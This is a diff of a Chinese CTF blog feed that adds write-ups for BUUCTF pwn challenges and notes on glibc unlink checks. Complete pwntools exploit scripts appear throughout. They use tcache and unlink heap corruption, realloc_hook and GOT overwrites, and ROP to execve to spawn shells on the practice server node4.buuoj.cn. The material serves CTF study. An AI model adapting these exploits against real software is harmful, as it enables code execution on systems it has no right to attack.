+<p>后面其实就没有什么了，就是申请出堆块，因为我们把tcache_perthread_struct释放了，所以申请出的堆块都在上面，那么可以通过这个来填写出目标地址，然后就会进入到tcache bin中，接着再申请就能任意地址写。这边还要注意的就是还要用realloc调整一下rsp</p>
+<p>然后这边说下，不知道是不是运气问题，爆破上千次都没打通</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./sctf_2019_one_heap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,28247)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Input the size:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Input the content:&quot;</span>)<br>	p.sendline(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rsp &amp; 0xf == 0</span><br><span class="hljs-string">  rcx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x40] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">first,second</span>):</span><br>	add(<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>	free()<br>	free()<br>	add(<span class="hljs-number">0x70</span>,p16((first &lt;&lt; <span class="hljs-number">8</span>) | <span class="hljs-number">0x10</span>))<br>	add(<span class="hljs-number">0x70</span>,p8(<span class="hljs-number">0x10</span>))<br>	add(<span class="hljs-number">0x70</span>,p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0x07000000</span>))<br>	free()<br>	add(<span class="hljs-number">0x40</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span>)<br>	add(<span class="hljs-number">0x10</span>,p64(<span class="hljs-number">0</span>) + p16((second &lt;&lt; <span class="hljs-number">8</span>) | <span class="hljs-number">0x60</span>))<br>	add(<span class="hljs-number">0x40</span>,p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>	p.recv(<span class="hljs-number">8</span>)<br>	leak_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>	log.success(<span class="hljs-string">&quot;leak_addr==&gt;0x%x&quot;</span> %leak_addr)<br>	libc_base = leak_addr - <span class="hljs-number">0x3ed8b0</span><br>	ogg = libc_base + <span class="hljs-number">0x10a38c</span><br>	realloc_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__realloc_hook&quot;</span>]<br>	realloc = libc_base + libc.sym[<span class="hljs-string">&quot;realloc&quot;</span>]<br>	log.success(<span class="hljs-string">&quot;realloc==&gt;0x%x&quot;</span> %realloc)<br>	log.success(<span class="hljs-string">&quot;one_gadget==&gt;0x%x&quot;</span> %ogg)<br>	add(<span class="hljs-number">0x10</span>,p64(<span class="hljs-number">0</span>) + p64(realloc_hook))<br>	add(<span class="hljs-number">0x40</span>,p64(ogg) + p64(realloc + <span class="hljs-number">0x4</span>))<br>	add(<span class="hljs-number">0x10</span>)<br><br>	<span class="hljs-keyword">try</span>:<br>		p.sendline(<span class="hljs-string">&quot;id&quot;</span>)<br>		p.recvline_contains(<span class="hljs-string">&quot;uid&quot;</span>, timeout=<span class="hljs-number">2</span>)<br>		p.sendline(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>		p.interactive()<br>	<span class="hljs-keyword">except</span>:<br>		<span class="hljs-keyword">try</span>:<br>			p.close()<br>		<span class="hljs-keyword">except</span>:<br>			<span class="hljs-keyword">pass</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>	n = <span class="hljs-number">0x1000</span><br>	<span class="hljs-keyword">while</span> n &gt; <span class="hljs-number">0</span>:<br>		log.success(<span class="hljs-string">&quot;counts: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0x1000</span> - n))<br>		<span class="hljs-keyword">try</span>:<br>			pwn(<span class="hljs-number">0x60</span>,<span class="hljs-number">0x67</span>)<br>		<span class="hljs-keyword">except</span>:<br>			<span class="hljs-keyword">pass</span><br>		<span class="hljs-comment">#p = process(argv=[ld.path,elf.path],env=&#123;&quot;LD_PRELOAD&quot; : libc.path&#125;)</span><br>		p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28247</span>)<br>		n -= <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="十四、warmup"><a href="#十四、warmup" class="headerlink" title="十四、warmup"></a>十四、warmup</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831104431370.png"><span class="image-caption">image-20210831104431370</span></p>
+<p>常规checksec一下，32位，只开了NX</p>
+<p>进入IDA，发现函数很少，而且都是调用系统调用号执行函数的。所以肯定是要执行到0xB的execve函数来getshell</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831104803643.png"><span class="image-caption">image-20210831104803643</span></p>
+<p>首先，要先制造出/bin/sh\x00才行，所以先跳转到read上去，往.bss段上写/bin/sh\x00。仔细看，这边传递的read的参数，都是来自于栈上的，而且都是esp前面的地址存的值，所以其实我们就是按照平常的写法，返回地址覆盖为这里的地址，然后再写一个新的返回地址，后面跟上read的三个参数<code>payload = &#39;a&#39;*0x20+p32(read)+p32(start)+p32(0)+p32(bss)+p32(8)</code></p>
+<p>然后返回到最初再次执行，因为执行完函数的返回值是存在eax中的，所以为了达成0xb，第二次执行read函数时，要输入0xb个数据，因为execve(/bin/sh,0,0)，所以我们第二次的返回地址要直接返回到read函数传参（此时eax已经是0xb了，不能再执行0x804811D，不然eax的值将会被修改），因为执行完ret后，esp会加4，移动到我们溢出的p32(0)，然后传参才会把/bin/sh地址传入到ebx中，而0x8048212这个地址，在于这个地址上的值必须是0，满足这个要求即可，这样才能满足后续传入的是两个0</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831104312190.png"><span class="image-caption">image-20210831104312190</span></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,25785)</span><br>p = process(<span class="hljs-string">&quot;./warmup&quot;</span>)<br>bss = <span class="hljs-number">0x80491bc</span><br>start = <span class="hljs-number">0x080480D8</span><br>read = <span class="hljs-number">0x0804811D</span><br>gdb.attach(p)<br>p.recvuntil(<span class="hljs-string">&#x27;2016!&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(read)+p32(start)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(<span class="hljs-number">8</span>)<br>p.send(payload)<br>p.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(read)+p32(<span class="hljs-number">0x08048122</span>)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(<span class="hljs-number">0x8048212</span>)<br>p.send(payload)<br>p.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">3</span>  )<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="十五、hitcontraining-unlink"><a href="#十五、hitcontraining-unlink" class="headerlink" title="十五、hitcontraining_unlink"></a>十五、hitcontraining_unlink</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831153526197.png"><span class="image-caption">image-20210831153526197</span></p>
+<p>常规checksec一下，64位，开了NX，Canary</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831154605863.png"><span class="image-caption">image-20210831154605863</span></p>
+<p>进入IDA，四个菜单功能都具备，同时还找到个后门函数，但是看路径，应该是用不了的，buu的flag就在根目录下的</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831155631822.png"><span class="image-caption">image-20210831155631822</span></p>
+<p>漏洞点在于修改函数里面，对于修改的size没有检查，存在堆溢出</p>
+<p>由于在输入后会加0截断，并且没开PIE，堆指针简单可寻，所以这题用unlink做。目标是劫持atoi的got，</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831202645476.png"><span class="image-caption">image-20210831202645476</span></p>
+<p>这里是触发了unlink，下一个大小为0x80的堆块与我们伪造的大小为0x40的堆块合并放入unsorted bin 中</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831203042925.png"><span class="image-caption">image-20210831203042925</span></p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831203937694.png"><span class="image-caption">image-20210831203937694</span></p>
+<p>同时，指向chunk0的指针保存的地址换为了ptr - 0x18的值，所以，此时可以认为chunk0变成是在ptr - 0x18的地方了。所以此时再把堆指针改为函数got表地址，从而泄露libc地址</p>
+<p>而刚好，此时又是atoi的got表地址，所以直接继续往里面写入system的地址即可，最后再输入/bin/sh\x00即可</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831204445381.png"><span class="image-caption">image-20210831204445381</span></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./1&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25062</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;length of item name:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;the name of item:&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index of item:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;length of item name:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.recvuntil(<span class="hljs-string">&quot;the new name of the item:&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;the index of item:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>atoi_got = elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>ptr = <span class="hljs-number">0x00000000006020C8</span><br>add(<span class="hljs-number">0x40</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;c&#x27;</span>)<br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x41</span>) <span class="hljs-comment">#fake_chunk header</span><br>fake_chunk += p64(ptr - <span class="hljs-number">0x18</span>) + p64(ptr - <span class="hljs-number">0x10</span>) <span class="hljs-comment">#fake_chunk fd  bk</span><br>fake_chunk += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0x90</span>) <span class="hljs-comment">#fake prev_size size</span><br>edit(<span class="hljs-number">0</span>,fake_chunk)<br>free(<span class="hljs-number">1</span>)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0x40</span>) + p64(atoi_got)<br>edit(<span class="hljs-number">0</span>,payload)<br>show()<br>p.recvuntil(<span class="hljs-string">&#x27;0 : &#x27;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] <br>log.success(<span class="hljs-built_in">hex</span>(system))<br>edit(<span class="hljs-number">0</span>,p64(system))<br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="十六、wustctf2020-closed"><a href="#十六、wustctf2020-closed" class="headerlink" title="十六、wustctf2020_closed"></a>十六、wustctf2020_closed</h2><p>这题比较有意思，记录一下，考的是linux的基础知识</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210902152712612.png"><span class="image-caption">image-20210902152712612</span></p>
+<p>进入IDA，程序十分简单，甚至主函数已经运行了system(“/bin/sh”)了，但是注意这边执行了close(1)以及close(2)。这代表什么？代表关闭了linux里面的标准输出(1)和标准错误(2)，所以即使已经getshell了，但是我们是看不到输出的，所以这时候输入<code>exec 1&gt;&amp;0</code>就可以让标准输出的文件描述符重定向为0，而0没被关闭，才能看到输出</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210902152420434.png"><span class="image-caption">image-20210902152420434</span></p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210902152447680.png"><span class="image-caption">image-20210902152447680</span></p>
+<h2 id="十七、"><a href="#十七、" class="headerlink" title="十七、"></a>十七、</h2><h2 id="十八、"><a href="#十八、" class="headerlink" title="十八、"></a>十八、</h2><h2 id="十九、"><a href="#十九、" class="headerlink" title="十九、"></a>十九、</h2><h2 id="二十"><a href="#二十" class="headerlink" title="二十"></a>二十</h2>]]></content>
+      <tags>
+        <tag>buu</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>house of系列</title>
     <url>/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/</url>
     <content><![CDATA[<p> 该系列内容较多，将会在较长时间持续更新</p>
@@ -200,8 +506,7 @@
     <content><![CDATA[<h3 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h3><p>常规checksec一下，看看保护</p>
 <p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210605121040.png"></p>
 <p>只开启了NX</p>
-<p>进入ida看看代码</p>
-<p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210605121308.png"></p>
+<p>进入ida看看代码<img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210605121308.png"></p>
 <p>第一个功能很神奇的让我们输入一个长度为0x10的数据，然后用system调用？我跑去nc了一下</p>
 <p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210605121007.png"></p>
 <p>好吧，成功获得flag了。</p>
@@ -296,6 +601,42 @@
 <p>exp</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25028</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p.recvuntil(<span class="hljs-string">&quot;have:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;0&#x27;</span>)<br>get_shell = [<span class="hljs-number">0x9b</span>,<span class="hljs-number">0x85</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x08</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>	p.sendlineafter(<span class="hljs-string">&quot;5. exit&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;change&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x84</span>+i))<br>	p.sendlineafter(<span class="hljs-string">&quot;number:&quot;</span>,<span class="hljs-built_in">str</span>(get_shell[i]))<br>p.sendlineafter(<span class="hljs-string">&quot;5. exit&quot;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
+<h3 id="ZJCTF-2019-Login"><a href="#ZJCTF-2019-Login" class="headerlink" title="[ZJCTF 2019]Login"></a>[ZJCTF 2019]Login</h3><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812160620361.png"><span class="image-caption">image-20210812160620361</span></p>
+<p>先checksec一下，64位，开启了nx和canary，可能要泄露canary，进入ida分析一下</p>
+<p>进入程序，是个用c++编写的程序，看起来有些费力</p>
+<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812162011685.png"><span class="image-caption">image-20210812162011685</span></p>
+<p>首先找到了一个后门函数，那么就再去找找输入点，看看有没有溢出，以及找找有没有函数调用的地方。然后可以发现，输入点是不存在溢出到返回地址的，但是可以找到一个能进行函数调用的地方</p>
+<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812162329071.png"><span class="image-caption">image-20210812162329071</span></p>
+<p>在整个程序的最后，进行密码验证，如果通过就会进行函数调用。那么，就去找找这个函数调用从哪里传入，是否可以修改？以及怎么通过检验</p>
+<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812165314541.png"><span class="image-caption">image-20210812165314541</span></p>
+<p>首先通过验证，把这的账号密码输入进去即可</p>
+<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812165836228.png"><span class="image-caption">image-20210812165836228</span></p>
+<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812165850893.png"><span class="image-caption">image-20210812165850893</span></p>
+<p>然后就是要进行覆盖，把v8覆盖为后门函数，v8又来自vuln，而vuln似乎不是我们可以控制的变量。但是去查汇编代码，可以知道最后的函数调用，表现是call rax，那是否可以去修改rax的数据呢？</p>
+<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812170456157.png"><span class="image-caption">image-20210812170456157</span></p>
+<p>这里很有意思，在call rax前可以追溯到rax的值来自栈上一个数据，可以去看看能不能覆盖</p>
+<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812172747784.png"><span class="image-caption">image-20210812172747784</span></p>
+<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812172859005.png"><span class="image-caption">image-20210812172859005</span></p>
+<p>这里传入的rax的值就是源头，而这里的值是栈上的，并且我们是可以覆盖的，就是在第二个输入点输入密码的地方</p>
+<p>成功getshell</p>
+<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812164617984.png"><span class="image-caption">image-20210812164617984</span></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29528</span>)<br>shell = <span class="hljs-number">0x400E88</span><br><br>p.recvuntil(<span class="hljs-string">&quot;username:&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;admin&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;password:&quot;</span>)<br>payload = <span class="hljs-string">&quot;2jctf_pa5sw0rd&quot;</span>.ljust(<span class="hljs-number">0x48</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(shell)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h3 id="mrctf2020-easyrop"><a href="#mrctf2020-easyrop" class="headerlink" title="mrctf2020_easyrop"></a>mrctf2020_easyrop</h3><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812175441484.png"><span class="image-caption">image-20210812175441484</span></p>
+<p>checksec，64位，只开启nx</p>
+<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812180035772.png"><span class="image-caption">image-20210812180035772</span></p>
+<p>首先程序存在后门，但是依照逻辑是不可能运行到后门的，所以需要劫持rip执行后门函数</p>
+<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812181120347.png"><span class="image-caption">image-20210812181120347</span></p>
+<p>所有的输入点都是从var_310开始输入的，然而最大的输入长度也不过是0x300，不够覆盖到返回地址</p>
+<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812181040014.png"><span class="image-caption">image-20210812181040014</span></p>
+<p>仔细分析程序，可以发现这边有个数组越界，这里的a1是var_310，所以可以先用别的函数输入数据，然后越界覆盖返回地址为后门函数</p>
+<p>这边有个注意点：覆盖成功后退出程序时，程序还是会执行到数组越界的函数，所以这时候的输入只能是输入一个’\x00’，并且不能含有换行符，否则会接在前面输入的后门函数的地址上，导致地址无效了</p>
+<p>在本地成功getshell，远程的docker可能出问题了，没有反应</p>
+<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812184240747.png"><span class="image-caption">image-20210812184240747</span></p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,26109)</span><br>p = process(<span class="hljs-string">&quot;./mrctf2020_easyrop&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>shell = <span class="hljs-number">0x40072A</span><br><br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x2ff</span> + <span class="hljs-string">&#x27;\x00&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;hehehehehehehe\n&quot;</span>,payload)<br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x19</span> + p64(shell)<br>p.sendlineafter(<span class="hljs-string">&quot;bybybybybybyby\n&quot;</span>,payload)<br>p.sendline(<span class="hljs-string">&#x27;7&#x27;</span>)<br>p.send(<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
 ]]></content>
       <tags>
         <tag>buu</tag>
@@ -305,9 +646,69 @@
     <title>不安全的unlink</title>
     <url>/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/</url>
     <content><![CDATA[<p>以下知识摘自《CTF竞赛权威指南 Pwn篇》、CTF-Wiki</p>
-<h1 id="不安全的unlike"><a href="#不安全的unlike" class="headerlink" title="不安全的unlike"></a>不安全的unlike</h1><h3 id="什么叫unlike"><a href="#什么叫unlike" class="headerlink" title="什么叫unlike"></a>什么叫unlike</h3><p>为了避免堆内存的过度碎片化，当一个堆块（非fastbin chunk）被释放时，libc会查看其前后堆块是否处于被释放的状态，如果是，则将前面或后面的堆块从bins链取出来，与当前释放堆块合并，这个取出堆块的过程就叫做unlike</p>
+<h1 id="不安全的unlike"><a href="#不安全的unlike" class="headerlink" title="不安全的unlike"></a>不安全的unlike</h1><h2 id="什么叫unlike"><a href="#什么叫unlike" class="headerlink" title="什么叫unlike"></a>什么叫unlike</h2><p>为了避免堆内存的过度碎片化，当一个堆块（非fastbin chunk）被释放时，libc会查看其前后堆块是否处于被释放的状态，如果是，则将前面或后面的堆块从bins链取出来，与当前释放堆块合并，这个取出堆块的过程就叫做unlike</p>
 <p>基本过程如下图所示</p>
 <p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/unlink_smallbin_intro.png"></p>
+<p>上述的操作进行了如下的赋值</p>
+<ul>
+<li><p>*( fd + 0x18 ) = bk</p>
+</li>
+<li><p>*( bk + 0x10 ) = fd</p>
+</li>
+</ul>
+<h3 id="unlink中的检查"><a href="#unlink中的检查" class="headerlink" title="unlink中的检查"></a>unlink中的检查</h3><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span><br><span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))      \<br>      malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);               \<br>      <br><span class="hljs-comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span><br><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))                      \<br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \<br><br>  <span class="hljs-comment">// largebin 中 next_size 双向链表完整性检查 </span><br>              <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)              \<br>                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))    \<br>              malloc_printerr (check_action,                                      \<br>                               <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,P, AV);  \<br></code></pre></td></tr></table></figure>
+
+<h2 id="利用unlink"><a href="#利用unlink" class="headerlink" title="利用unlink"></a>利用unlink</h2><p>要利用unlink首先要绕过上面提到的两个检查：</p>
+<ol>
+<li><p>size检查：</p>
+<p>在堆中有两个地方存储了P的size：第一个是当前P-&gt;size，第二个是next_chunk-&gt;prev_size，比较两者大小</p>
+</li>
+<li><p>fd和bk检查：</p>
+<p>检查P是否在双向链表中，在双向链表中有两个指针指向P：第一个是FD-&gt;bk，第二个是BK-&gt;fd</p>
